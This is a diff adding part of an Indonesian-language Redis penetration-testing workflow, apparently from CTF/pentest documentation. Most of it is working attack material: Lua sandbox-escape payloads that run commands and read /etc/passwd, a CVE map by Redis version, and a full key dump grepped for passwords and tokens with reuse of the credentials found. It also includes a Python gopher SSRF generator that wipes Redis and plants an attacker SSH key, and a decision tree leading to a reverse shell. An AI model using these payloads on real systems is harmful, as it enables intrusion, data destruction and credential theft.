+    "/usr/lib/x86_64-linux-gnu/liblua5.2.so.0" \
+    "/usr/lib/x86_64-linux-gnu/liblua5.3.so.0" \
+    "/usr/lib/liblua.so" \
+    "/usr/local/lib/liblua.so"; do
+    result=$(redis-cli -h $TARGET EVAL "return package.loadlib('$libpath', 'luaopen_io')" 0 2>&1)
+    if ! echo "$result" | grep -q "cannot open"; then
+        echo "[+] Library found at: $libpath"
+        break
+    fi
+done
+```
+
+---
+
+#### Alternatif 5.5C — Exploit CVE Spesifik Berdasarkan Versi
+
+Bash
+
+```
+# Identifikasi versi Redis dengan detail:
+redis-cli -h $TARGET INFO server | grep -E "redis_version|redis_git|os"
+```
+
+text
+
+```
+Versi Redis → CVE yang Relevan:
+
+Redis 2.8.x / 3.0.x
+└─ CVE-2015-4335: eval sandbox bypass
+   → Google: "CVE-2015-4335 exploit redis"
+   → PoC: Lua sandbox escape via EVAL
+
+Redis 3.2.x  
+└─ CVE-2016-8339: buffer overflow di CONFIG SET client-output-buffer-limit
+   → Google: "CVE-2016-8339 exploit PoC"
+
+Redis 6.0.x - 6.2.x
+└─ CVE-2021-32761: integer overflow di GETDEL/COPY
+   → Mostly DoS, less useful for RCE
+
+Redis 7.0.0 - 7.0.4 (Debian/Ubuntu)
+└─ CVE-2022-0543: Lua sandbox escape
+   → Lihat Alternatif 5.5B
+
+Semua versi (Unauthenticated)
+└─ SSRF via Redis GOPHER protocol
+   → Jika ada web app yang pakai Redis via URL
+   → Google: "redis gopher SSRF RCE"
+```
+
+Bash
+
+```
+# Contoh exploit CVE-2015-4335 (Redis 2.8.x/3.0.x):
+redis-cli -h $TARGET EVAL "
+  dofile('/etc/passwd')
+" 0
+# Atau:
+redis-cli -h $TARGET EVAL "
+  os.execute('id')
+" 0
+
+# Jika sandbox sudah di-patch, coba:
+redis-cli -h $TARGET EVAL "
+  local a = {}
+  local mt = {}
+  setmetatable(a, mt)
+  mt.__index = function(t, k)
+    return rawget(t, k) or rawget(a, k)
+  end
+  return redis.pcall(\"eval\", \"return os.execute('id')\", 0)
+" 0
+```
+
+---
+
+#### Alternatif 5.5D — Pivot via Redis sebagai Credential Source
+
+> **Scenario:** Tidak bisa RCE via Redis, tapi Redis menyimpan data berharga.
+
+Bash
+
+```
+# Jika module loading, cron, SSH, webshell semua gagal:
+# Redis masih berguna sebagai sumber informasi!
+
+# Dump semua key dan value:
+redis-cli -h $TARGET --scan | while read key; do
+    echo "=== $key ==="
+    TYPE=$(redis-cli -h $TARGET TYPE "$key" | tr -d '\r')
+    case $TYPE in
+        string) redis-cli -h $TARGET GET "$key" ;;
+        hash)   redis-cli -h $TARGET HGETALL "$key" ;;
+        list)   redis-cli -h $TARGET LRANGE "$key" 0 -1 ;;
+        set)    redis-cli -h $TARGET SMEMBERS "$key" ;;
+        zset)   redis-cli -h $TARGET ZRANGE "$key" 0 -1 WITHSCORES ;;
+    esac
+done | tee ~/redis_mongo_loot/redis/full_dump.txt
+
+# Analisis hasil dump
+grep -iE "password|passwd|pass|secret|key|token|cred" \
+    ~/redis_mongo_loot/redis/full_dump.txt
+
+# Cari session yang bisa di-hijack:
+grep -iE "session|auth|jwt|bearer" \
+    ~/redis_mongo_loot/redis/full_dump.txt
+
+# Test credentials yang ditemukan ke service lain:
+# → SSH, Web login, Database, dll
+```
+
+**OUTPUT BERHASIL ✅ — Credentials ditemukan di Redis:**
+
+text
+
+```
+=== app:config ===
+1) "db_password"
+2) "ProductionPass2024!"
+3) "admin_token"
+4) "sk-admin-super-secret-key"
+```
+
+➡️ Test credentials ke semua service:
+
+Bash
+
+```
+ssh admin@$TARGET  # password: ProductionPass2024!
+curl -H "Authorization: Bearer sk-admin-super-secret-key" "http://$TARGET/api/admin/"
+
+# → Ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a> jika SSH berhasil
+# → Ke <a href="/docs/jwt" class="text-[#00b4d8] hover:underline font-mono font-semibold">28_jwt_workflow.md</a> jika dapat JWT token
+```
+
+---
+
+#### Alternatif 5.5E — SSRF via Gopher Protocol (Redis sebagai Target SSRF)
+
+> **Scenario:** Ada aplikasi web yang vulnerable ke SSRF dan Redis berjalan di localhost.
+
+Bash
+
+```
+# Jika Redis hanya accessible dari localhost (bind 127.0.0.1),
+# tapi ada web app dengan SSRF vulnerability:
+
+# Construct Redis command via Gopher URL:
+# Format: gopher://127.0.0.1:6379/_%0d%0aCOMMAND%0d%0a
+
+# Test SSRF ke Redis:
+curl "http://$TARGET/fetch?url=gopher://127.0.0.1:6379/_%0d%0aPING%0d%0a"
+
+# Jika berhasil (response ada "+PONG"):
+# Craft payload untuk SSH key injection via SSRF + Gopher:
+python3 << 'EOF'
+import urllib.parse
+
+LHOST = "10.10.14.5"
+SSH_PUB = "ssh-rsa AAAA... attacker@parrot"
+
+# Redis commands untuk inject SSH key
+commands = [
+    "*1\r\n$8\r\nFLUSHALL\r\n",
+    f"*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$17\r\n/home/redis/.ssh/\r\n",
+    f"*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$15\r\nauthorized_keys\r\n",
+    f"*3\r\n$3\r\nSET\r\n$6\r\npubkey\r\n${len(SSH_PUB)+4}\r\n\n\n{SSH_PUB}\n\n\r\n",
+    "*1\r\n$4\r\nSAVE\r\n",
+]
+
+payload = "".join(commands)
+encoded = urllib.parse.quote(payload, safe="")
+gopher_url = f"gopher://127.0.0.1:6379/_{encoded}"
+print("GOPHER URL:")
+print(gopher_url)
+EOF
+
+# Test SSRF dengan Gopher payload:
+# curl "http://$TARGET/fetch?url=GOPHER_URL_DARI_OUTPUT_PYTHON"
+```
+
+**OUTPUT BERHASIL ✅ — SSRF + Gopher Redis injection:**
+
+text
+
+```
+HTTP/1.1 200 OK
+
++OK
++OK
++OK
++OK
++OK
+```
+
+➡️ Redis commands berhasil dieksekusi via SSRF! Lanjut SSH:
+
+Bash
+
+```
+ssh -i ~/.ssh/redis_exploit redis@$TARGET
+```
+
+---
+
+### Langkah 5.6 — Cleanup Setelah Module Load Berhasil
+
+> **Setelah mendapat shell via module — lakukan cleanup agar tidak merusak sistem.**
+
+Bash
+
+```
+# DARI DALAM SHELL atau via redis-cli:
+
+# 1. Unload module (optional tapi clean)
+redis-cli -h $TARGET MODULE UNLOAD shell
+
+# 2. Reset Redis ke direktori awal
+redis-cli -h $TARGET CONFIG SET dir /var/lib/redis/
+redis-cli -h $TARGET CONFIG SET dbfilename dump.rdb
+
+# 3. Hapus file .so dari target (jika ada akses)
+# Dari shell:
+rm /tmp/redis_shell.so
+
+# 4. Restore FLUSHALL data yang hilang (jika production)
+# (Di CTF tidak perlu, tapi di real pentest penting!)
+# Dokumentasikan data apa yang di-FLUSHALL
+```
+
+---
+
+### Ringkasan FASE 5 — Decision Tree Module Loading
+
+text
+
+```
+FASE 5: Redis Module Loading
+│
+├─ CEK: Redis versi >= 4.0?
+│   ├─ YES: Lanjut
+│   └─ NO (3.x): 
+│       ├─ Coba CVE-2015-4335 (Lua bypass)
+│       └─ Kembali ke Fase 4 (File Write)
+│
+├─ CEK: MODULE command tersedia?
+│   ├─ YES: Lanjut
+│   └─ NO (disabled/renamed):
+│       ├─ Coba via Lua: redis.call('MODULE', ...)
+│       ├─ Coba SLAVEOF attack (5.5A)
+│       └─ Cek versi untuk CVE spesifik (5.5C)
+│
+├─ CEK: Bisa write .so ke target?
+│   ├─ YES (/tmp/ atau path lain):
+│   │   └─ Upload via HTTP server / webshell / netcat
+│   └─ NO:
+│       ├─ Coba SLAVEOF attack (module dikirim via RDB)
+│       └─ Cari akses lain dulu (webshell/LFI/dll)
+│
+├─ MODULE LOAD berhasil?
+│   ├─ YES: Execute command → Reverse shell
+│   └─ NO:
+│       ├─ "Operation not permitted" → AppArmor/SELinux blocking
+│       │   ├─ Coba path yang di-whitelist (/var/lib/redis/, /usr/lib/redis/)
+│       │   └─ Disable AppArmor dari root shell (jika ada)
+│       ├─ "No such file" → File tidak ada/salah path
+│       │   └─ Upload ulang, verifikasi path
+│       ├─ "invalid ELF" → Arsitektur salah
+│       │   └─ Recompile untuk target arch (64-bit/32-bit)
+│       ├─ "undefined symbol" → Versi API tidak match
+│       │   └─ Download redismodule.h sesuai versi, recompile
+│       └─ Semua gagal:
+│           ├─ Coba SLAVEOF attack (5.5A)
+│           ├─ Coba Lua CVE-2022-0543 (5.5B)
+│           ├─ Cek CVE sesuai versi (5.5C)
+│           ├─ Pivot via Redis credential dump (5.5D)
+│           └─ SSRF + Gopher jika Redis di localhost (5.5E)
+│
+└─ Shell berhasil → Cleanup module → Post-Exploitation
+```
+
+---
+
+## ═══════════════════════════════════════
+
+## TROUBLESHOOTING FASE 4 & 5 — QUICK REFERENCE
+
+## ═══════════════════════════════════════
+
+|Situasi|Penyebab|Solusi|
+|---|---|---|
+|SSH key inject → `Permission denied (publickey)`|Direktori `.ssh` belum ada atau StrictModes|Buat dir dulu via Redis, atau cek permission|
+|Cron payload inject tapi shell tidak masuk|Redis bukan root, path cron salah, firewall outbound|Cek user Redis, coba `/etc/cron.d/`, coba bind shell|
+|Webshell di-drop tapi HTTP 404|Path bukan web root yang benar|Enumerate dengan nmap http-enum, coba path lain|
+|Webshell HTTP 200 tapi output kosong|PHP tidak enabled, server bukan PHP|Coba `.phtml`, cek header Server, switch ke PHP-FPM fix|
+|`MODULE LOAD: Operation not permitted`|AppArmor/SELinux blocking|Coba path yang di-whitelist, disable AppArmor|
+|`MODULE LOAD: invalid ELF header`|Arsitektur compile salah|Recompile dengan `-m64` atau `-m32` sesuai target|
+|`MODULE LOAD: undefined symbol`|Redis API version mismatch|Download `redismodule.h` sesuai versi Redis target, recompile|
+|`ERR unknown command 'MODULE'`|MODULE disabled/renamed|Coba via Lua, SLAVEOF attack, atau CVE Lua sandbox|
+|SLAVEOF gagal|Redis di cluster/sentinel mode|Coba Lua CVE atau direct module upload|
+|CVE-2022-0543 gagal|Bukan Debian/Ubuntu atau versi tidak match|Cari library Lua path lain, atau coba versi library berbeda|
+|Semua Fase 4 dan 5 gagal|Redis sangat terbatas|Dump semua key/value → cari credentials → pivot ke service lain|
 
 ---
 
